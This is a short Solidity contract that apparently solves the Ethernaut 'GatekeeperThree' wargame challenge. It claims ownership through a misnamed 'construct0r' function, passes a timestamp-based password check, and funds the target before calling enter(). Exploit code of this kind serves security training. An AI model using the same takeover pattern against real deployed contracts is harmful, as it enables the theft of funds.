// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract HackGatekeeperThree {
    function attack(GatekeeperThree _gatekeeperThree) external payable {
        _gatekeeperThree.construct0r();

        _gatekeeperThree.createTrick();
        _gatekeeperThree.getAllowance(block.timestamp);

        payable(address(_gatekeeperThree)).transfer(msg.value);

        _gatekeeperThree.enter();

        // 1000000000000001
    }
}